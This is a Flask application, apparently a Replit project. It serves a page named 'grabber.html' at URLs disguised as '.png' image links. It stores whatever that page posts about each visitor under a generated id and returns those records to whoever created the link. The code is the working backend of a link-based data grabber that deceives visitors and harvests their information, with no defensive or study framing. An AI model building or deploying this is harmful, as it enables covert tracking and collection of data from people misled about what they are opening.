from flask import Flask, jsonify, request, render_template
from flask_cors import CORS
from replit import db
import uuid, time

app = Flask(__name__)
CORS(app)

@app.route('/')
def app_index():
    return render_template('index.html', path=request.path)

@app.route('/<uid>.png')
def app_uid(uid):
    return render_template('grabber.html', uid=uid, path=request.path)

@app.route('/api/create')
def api_create():
    uid = str(uuid.uuid4())
    db[uid] = []
    return jsonify({'uid': uid})

@app.route('/api/get', methods=['POST'])
def api_get():
    data = request.get_json() or request.json or request.form
    return jsonify(db.get(data['uid']))

@app.route('/api/post', methods=['POST'])
def api_post():
    data = dict(request.get_json() or request.json or request.form)
    if data['uid'] in list(db.keys()):
        old = db[data['uid']]
        data['time'] = time.time()
        old.append(data)
        db[data['uid']] = old
    return 'ok'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)